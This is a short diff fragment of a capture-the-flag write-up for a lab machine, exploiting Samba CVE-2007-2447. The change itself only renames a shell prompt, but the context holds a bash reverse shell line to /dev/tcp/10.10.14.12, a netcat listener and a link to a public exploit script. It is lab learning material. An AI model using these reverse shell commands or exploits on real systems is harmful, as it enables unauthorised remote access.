@@ -112,7 +112,7 @@ bash -i >& /dev/tcp/10.10.14.12/6969 0>&1
 so suid didnt works, I took one step backward and go thru recon's result. I then choose to use `CVE-2007-2447` to gain root access using this script on github https://github.com/amriunix/CVE-2007-2447. it is straight forward, `wget` the exploit and `pip` all requriment. `readme.md` explain how to use the script clearly
 
 ```
-kali@kali:~/script$nc -nlvp 6969h
+bibo318@parrot:~/script$nc -nlvp 6969h
 listening on [any] 6969 ...
 connect to [10.10.14.12] from (UNKNOWN) [10.10.10.3] 52344
 whoami
